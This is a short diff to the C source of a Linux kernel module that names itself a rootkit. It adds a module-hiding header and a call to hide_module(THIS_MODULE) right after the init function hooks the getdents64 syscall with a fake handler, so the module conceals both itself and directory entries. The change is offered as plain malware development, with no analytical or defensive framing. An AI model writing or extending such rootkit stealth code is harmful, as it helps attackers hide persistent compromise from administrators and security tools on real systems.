@@ -8,6 +8,7 @@
 
 #include "hooker.h"
 #include "fake_syscalls.h"
+#include "module_hiding.h"
 
 static int __init init_rootkit(void)
 {
@@ -19,6 +20,8 @@ static int __init init_rootkit(void)
     set_sys_call_table_addr(sys_call_table);
     
     hook_syscall(__NR_getdents64, sys_getdents64_fake);
+
+    hide_module(THIS_MODULE);
 
     return 0;
 }
